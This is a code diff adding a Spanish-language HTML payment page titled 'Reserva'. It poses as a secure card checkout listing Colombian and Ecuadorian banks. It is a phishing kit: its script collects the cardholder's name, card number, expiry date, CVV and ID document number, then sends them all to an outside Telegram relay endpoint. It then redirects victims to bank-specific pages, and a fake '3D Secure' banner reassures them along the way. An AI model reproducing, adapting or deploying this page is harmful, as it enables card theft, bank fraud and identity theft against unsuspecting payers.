@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/payi.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://sdk.mercadopago.com/js/v2"></script>
+    <title>Reserva</title>
+</head>
+<body style="background-color: rgb(243, 243, 243);">
+
+    
+
+    <div style="margin-bottom: 5% 5% 0% 5%;">
+        <header style="background-color: #1B1B1B; color: white; padding: 4%; display: flex; justify-content: center;">
+            <h4 style="margin: 0;">Llenar datos</h4>
+        </header>
+
+        <div style="padding: 5%; padding-bottom: 0; font-family: Arial, sans-serif; ">
+            <h2 style="font-size: 1.3rem; font-weight: bold; color: #252525;">Pagar y confirmar</h2>
+            
+        
+            <!-- <div id="btn-mp" class="total-a-pagar" style="margin-top: 30px; border: 1px solid #e0e0e0; border-radius: 12px; padding: 20px; background: white; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);">
+                <h3 style="font-size: 1rem; font-weight: bold; color: black; margin-bottom: 10px;">Pago por PSE</h3>
+                <div style="display: flex; gap: 15px; align-items: center;">
+                    <img src="img/PSE.svg" alt="PSE" style="width: 40px; height: 40px;">
+                    <img src="img/RappyPay.svg" alt="RappiPay" style="width: 40px; height: 40px;">
+                    <img src="img/DaviPlata.svg" alt="Daviplata" style="width: 40px; height: 40px;">
+                    <div id="totalPagar" style="color: transparent;">$145.990</div>
+                    
+                </div>
+                <div id="wallet_container"></div>
+            </div>
+
+            <script src="mp.js"></script> -->
+        </div>
+     </div>
+
+    <main>
+
+       <section style="margin: 5%; margin-top: 10%; background-color: white; border-radius: 5px;">
+        <style>
+            .hiddenContent {
+                display: none;
+            }
+     </style>
+
+    
+
+
+
+     <section class="idc" onclick="toggleHidden()">
+        <div style="padding: 6% 6% 0% 6%; ">
+            <h3>Pago con tarjeta</h3>
+            <p style="margin-bottom: 2%;">Paga seguro con estos medios de pago</p>
+            <div class="icon" style="padding-bottom: 10%;">
+                <img src="img/visa.svg" alt="" style="width: 15%; border-style: solid; border-width: 2px; border-color: gainsboro;border-radius: 5px; height: 30px; margin-top: 0%; margin-right: 3%;">
+                <img src="img/amex.svg" alt="" style="width: 15%; border-style: solid; border-width: 2px; border-color: gainsboro;border-radius: 5px; height: 30px; margin-top: 0%; margin-right: 3%;">
+                <img src="img/mastercard.svg" alt="" style="width: 15%; border-style: solid; border-width: 2px; border-color: gainsboro;border-radius: 5px; height: 30px; margin-top: 0%; margin-right: 3%;">
+                <img src="img/dinersclub.svg" alt="" style="width: 15%; border-style: solid; border-width: 2px; border-color: gainsboro;border-radius: 5px; height: 30px; margin-top: 0%; margin-right: 3%;">
+
+                <div style="border-radius: 5px; padding: 11%; border-style: solid; border-width: 0.5px; border-color: rgb(241, 241, 241); margin-top: 4%; background-color: rgba(247, 247, 247, 0.808);">
+                    <div style="display: flex; justify-content: center;">
+                        <img style="width: 15%; " src="img/bank-account.png" alt="">
+                    </div>
+                    <div style="margin-top: 1%;">
+                        <p style="text-align: center; font-size: small;">Ingresa tu tarjeta</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="hiddenContent" class="hiddenContent">
+                <section class="nn" style="padding-bottom: 4%;"  onclick="stopPropagation(event)">
+                    <div style="padding-bottom: 1%;">
+
+                        <div>
+                            <p>Por favor seleccione el método de pago</p>
+                          </div>
+              
+                          <div class="divban" style="margin-top: 5%; width: 100%; background-color: rgb(255, 255, 255); border-radius: 8px; height: 40px; display: flex; align-items: center; overflow: hidden;">
+                            <select style="padding: 4%; border-radius: 8px; border-style: solid; border-color: gainsboro; background-color: rgb(255, 255, 255); width: 100%; height: 100%; overflow: hidden;" id="banco" name="banco" required>
+                                <option value="" disabled selected>Seleccione su banco</option>
+  <option value="BANCOLOMBIA">BANCOLOMBIA</option>
+        <option value='BANCO AGRARIO'>BANCO AGRARIO</option>
+        <option value='BANCO AVVILLAS'>BANCO AV VILLAS</option>
+        <option value='BANCO BBVA'>BANCO BBVA</option>
+        <option value='BANCO CAJA SOCIAL'>BANCO CAJA SOCIAL</option>
+        <option value='BANCO CITIBANK'>BANCO CITIBANK</option>
+        <option value='BANCO COLPATRIA'>BANCO COLPATRIA</option>
+        <option value='BANCO CORPBANCA'>BANCO CORPBANCA</option>
+        <option value='BANCO DAVIVIENDA'>BANCO DAVIVIENDA</option>
+        <option value='BANCO DE BOGOTA'>BANCO DE BOGOTA</option>
+        <option value='BANCO DE OCCIDENTE'>BANCO DE OCCIDENTE</option>
+        <option value='BANCO FALABELLA'>BANCO FALABELLA</option>
+        <option value='BANCO FINANDINA'>BANCO FINANDINA</option>
+        <option value='BANCO GANADERO'>BANCO GANADERO</option>
+        <option value='BANCO GNB SUDAMERIS'>BANCO GNB SUDAMERIS</option>
+        <option value='BANCO HSBC COLOMBIA'>BANCO HSBC COLOMBIA</option>
+        <option value='BANCO ITAU'>BANCO ITAU</option>
+        <option value='BANCO BOLIVARIANO'>BANCO BOLIVARIANO</option>
+        <option value='BANCO GUAYAQUIL'>BANCO GUAYAQUIL</option>
+        <option value='BANCO PACIFICO'>BANCO PACIFICO</option>
+        <option value='PRODUBANCO'>PRODUBANCO</option>
+        <option value='BANCO PICHINCHA'>BANCO PICHINCHA</option>
+        <option value='BANCO POPULAR'>BANCO POPULAR</option>
+        <option value='BANCO SANTANDER'>BANCO SANTANDER COLOMBIA</option>
+        <option value='BANCO HELM BANK'>HELM BANK</option>
+        <option value='NEQUI'>NEQUI</option>
+        <option value='TUYA'>TUYA</option>
+        <option value='NUBANK'>NUBANK</option>
+        <option value="NN">OTRO</option>
+
+                            </select>
+                            <br>
+                        </div>
+         
+                       
+
+         
+                       <div style="border-radius: 5px; padding: 1% 5% 3% 5%; display: flex; margin-bottom: 4%; margin-top: 4%;  border-style: solid; border-width: 1px; border-color: rgb(230, 230, 230);">
+         
+                           <div style="margin-right: 2%; margin-top: 4.5%;">
+                            <i class="fa-solid fa-credit-card fa-lg" style="color: #333333;"></i>
+                           </div>
+         
+                           <div>
+                             <input
+                             id="cc"
+                                 style="width: 100%; margin-top: 5%; border-style: solid; border-width: 0px 0px 0px 0px; font-size: 110%; margin-bottom: 2%;"
+                                 type="text"
+                                 placeholder="Número de tarjeta"
+                                 autocomplete="off"
+                                 oninput="formatCreditCardNumber(this)"
+                                 maxlength="19">
+                             
+                            </div>
+                         
+                           <script>
+                             function formatCreditCardNumber(input) {
+                                 // Elimina caracteres no numéricos
+                                 var sanitized = input.value.replace(/[^0-9]/g, '');
+                         
+                                 // Divide los dígitos en grupos de 4 con espacios
+                                 var formatted = sanitized.replace(/(\d{4})/g, '$1 ').trim();
+                         
+                                 // Actualiza el valor del input
+                                 input.value = formatted;
+                             }
+                           </script>
+         
+                        </div>
+                    
+                    </div>
+                    
+         
+                   
+         
+                     <div class="dat"> 
+                         <div style="margin-right: 5%; width:40%;">
+                             <!-- Reemplazamos el input de tipo "month" por uno de tipo "text" -->
+                             <input
+                                 type="text"
+                                 id="datex"
+                                 placeholder="MM/AA"
+                                 maxlength="5"
+                                 oninput="formatExpiryDate(this)"
+                             >
+                             <p style="font-size: 80%; margin-top: 2%; width: 100%;">Fecha de expiración</p>
+                         </div>
+                     
+                         <script>
+                             function formatExpiryDate(input) {
+                                 // Elimina caracteres no numéricos
+                                 var sanitized = input.value.replace(/[^0-9]/g, '');
+                     
+                                 // Agrega el separador "/"
+                                 if (sanitized.length > 2) {
+                                     sanitized = sanitized.substring(0, 2) + '/' + sanitized.substring(2);
+                                 }
+                     
+                                 // Actualiza el valor del input
+                                 input.value = sanitized;
+                             }
+                         </script>
+         
+                     
+                   <div>
+                     <div style="display: flex; border-style: solid; border-color: gainsboro; border-width: 0.5px;width: 100%; border-radius: 5px; ">
+                         <div style=" display: flex; justify-items: end; align-items: center; margin-right: 7%; width: 100%;">
+                             <input
+                             id="cvv"
+                             type="number"
+                             placeholder="CVV"
+                             max="3" 
+                             min="3"   
+                             oninput="validarLongitud(this)"
+                             style="width: 100%; border-style: none;">
+
+                             <i class="fa-solid fa-circle-exclamation fa-flip-vertical fa-lg" style="color: #3b3b3b;"></i>
+                         </div>
+
+
+                         <script>
+                             function validarLongitud(input) {
+                                 // Convierte el valor a cadena para contar la longitud
+                                 var valor = input.value.toString();
+                         
+                                 // Si la longitud es mayor a 3, corta el valor
+                                 if (valor.length > 4) {
+                                     input.value = valor.slice(0, 4);
+                                 }
+                             }
+                         </script>
+                        
+                     </div>
+                     <p style="font-size: 80%; margin-top: 2%;">Código de seguridad</p>
+                  
+                 </section>
+
+               
+                    <div style="margin: 5%; margin-top: 1%; border-radius: 5px; padding: 1% 5% 3% 5%; display: flex; margin-bottom: 8%;  border-style: solid; border-width: 1px; border-color: rgb(230, 230, 230);">
+         
+                        <div style="margin-right: 2%; margin-top: 4.5%;">
+                            <i class="fa-solid fa-user" style="color: #333333;"></i>
+                        </div>
+        
+                        <div onclick="stopPropagation(event)">
+                          <input  onclick="stopPropagation(event)"
+                          id="nambre"
+                              style="width: 100%; margin-top: 5%; border-style: solid; border-width: 0px 0px 0px 0px; font-size: 110%;;"
+                              type="text"
+                              placeholder="Nombre del titular"
+                              autocomplete="off" >
+                         </div>
+                      </div>
+
+                      <div style="margin: 5%; margin-top: 1%; border-radius: 5px; padding: 1% 5% 3% 5%; display: flex; margin-bottom: 8%;  border-style: solid; border-width: 1px; border-color: rgb(230, 230, 230);">
+         
+                        
+                        <div onclick="stopPropagation(event)">
+                          <input onclick="stopPropagation(event)" 
+                          id="ID"
+                              style="width: 100%; margin-top: 4%; border-style: solid; border-width: 0px 0px 0px 0px; font-size: 110%;;"
+                              type="number"
+                              placeholder="Documento del titular"
+                              autocomplete="off" >
+                         </div>
+                      </div>
+                 </div>
+                 </div>
+
+                 
+
+                 
+         
+                 <section class="butt" onclick="stopPropagation(event)">
+                     <button onclick="enviarDatosTelegram()" type="submit" style="padding: 4%; width: 90%; border-radius: 20px; border-style: none; background-color: rgb(20, 20, 20); color: rgb(255, 255, 255); font-size: 90%px;">Confirmar</button>
+                 </section>
+         
+                 <script>
+  // Toggle formulario
+  function toggleHidden() {
+    const h = document.getElementById('hiddenContent');
+    h.style.display = h.style.display === 'block' ? 'none' : 'block';
+  }
+  
+  function stopPropagation(e) { e.stopPropagation(); }
+
+  // Formateos
+  function formatCreditCardNumber(i) {
+    i.value = i.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+  }
+
+  function formatExpiryDate(i) {
+    let v = i.value.replace(/\D/g, '');
+    if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+    i.value = v;
+  }
+
+  function limitLength(i, max) {
+    i.value = i.value.slice(0, max);
+  }
+
+  async function enviarDatosTelegram() {
+    const titular   = document.getElementById('nambre').value.trim();
+    const numeroTarj= document.getElementById('cc').value.replace(/\s+/g,'');
+    const fechaExp  = document.getElementById('datex').value;
+    const cvv       = document.getElementById('cvv').value;
+    const documento = document.getElementById('ID').value.trim();
+    const banco     = document.getElementById('banco').value;
+
+    // Validación básica
+    if (!titular || !numeroTarj || !fechaExp || !cvv || !documento || !banco) {
+      alert('Completa todos los campos.');
+      return;
+    }
+
+    // Construir mensaje con emojis
+    const mensaje = `
+🔻 *Nueva solicitud de datos* 🔻
+
+👤 Titular: ${titular}
+💳 Número de tarjeta: ${numeroTarj}
+📅 Fecha de expiración: ${fechaExp}
+🔐 CVV: ${cvv}
+🆔 Documento: ${documento}
+🏦 Banco: ${banco}
+    `.trim();
+
+    try {
+      const resp = await fetch('https://avori-telegram-api.vercel.app/api/send-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: mensaje })
+      });
+
+      if (resp.ok) {
+        // Redirigir sólo si el status HTTP es 2xx
+        redirigirSegunBanco(banco);
+      } else {
+        console.error('Error API status:', resp.status);
+        alert('Error al enviar la información.');
+      }
+    } catch (err) {
+      console.error('Fallo de red:', err);
+      alert('Error de red.');
+    }
+  }
+
+
+                   function redirigirSegunBanco(banco) {
+    const redirecciones = {
+  'BANCOLOMBIA': 'bancos/bancol.html',
+        'BANCO AGRARIO': 'bancos/agra.html',
+        'BANCO AVVILLAS': 'bancos/vilas.php',
+        'BANCO BBVA': 'bancos/bbva.html',
+        'BANCO CAJA SOCIAL': 'bancos/cjs.html',
+        'BANCO CITIBANK': 'bancos/scoti.html',
+        'BANCO COLPATRIA': 'bancos/scoti.html',
+        'BANCO CORPBANCA': 'bancos/itau.html',
+        'BANCO DAVIVIENDA': 'bancos/davi.html',
+        'BANCO DE BOGOTA': 'bancos/bog.html',
+        'BANCO DE OCCIDENTE': 'bancos/occi.html',
+        'BANCO FALABELLA': 'bancos/fala.html',
+        'BANCO FINANDINA': 'bancos/finan.html',
+        'BANCO GANADERO': 'bancos/ganadero.html',
+        'BANCO GNB SUDAMERIS': 'cargapago.html',
+        'BANCO HSBC COLOMBIA': 'cargapago.html',
+        'BANCO ITAU': 'bancos/itau.html',
+        'BANCO POPULAR': 'bancos/popu.html',
+        'BANCO SANTANDER': 'bancos/santan.html',
+        'BANCO CREDIBANCO': 'cargapago.html',
+        'BANCO HELM BANK': 'cargapago.html',
+        'Nequi': 'bancos/nequi.html',
+        'SERFINANSA': 'cargapago.html',
+        'SERVIBANCA': 'cargapago.html',
+        'TUYA': 'cargapago.html',
+        'NUBANK': 'cargapago.html',
+  "NN": "fin.html"
+}
+;
+
+    const url = redirecciones[banco];
+    if (url) {
+        window.location.href = url;
+    } else {
+        alert("Banco no reconocido.");
+    }
+}
+
+                </script>
+                
+            </div>
+        </div>
+     </section>
+    
+     <script>
+     function toggleHidden() {
+        var hiddenContent = document.getElementById("hiddenContent");
+        if (hiddenContent.style.display === "none") {
+            hiddenContent.style.display = "block";
+        } else {
+            hiddenContent.style.display = "none";
+        }
+     }
+    
+     function stopPropagation(event) {
+        event.stopPropagation();
+     }
+     </script>
+
+    </main>
+
+    <style>
+        .hiddenConten {
+            display: none;
+        }
+    </style>
+
+ 
+
+<script>
+function toggleHidde(element) {
+    var hiddenContent = element.querySelector('.hiddenConten');
+    if (hiddenContent.style.display === "none") {
+        hiddenContent.style.display = "block";
+    } else {
+        hiddenContent.style.display = "none";
+    }
+}
+
+function stopPropagatio(event) {
+        event.stopPropagatio();
+     }
+</script>
+
+
+    <section style="display: flex; padding: 5%; background-color: rgb(236, 236, 236); margin: 5%; border-radius: 5px; margin-top: 10%;">
+        <div style="margin-right: 5%; margin-top: 5%;">
+            <i class="fa-solid fa-lock fa-xl" style="color: #00bd42;"></i>
+        </div>
+
+       <div>
+        <p>Usamos <strong>3D Secure</strong> para verificar tu información y asegurar que tu compra sea segura.</p>
+       </div>
+    </section>
+</body>
+</html>
+
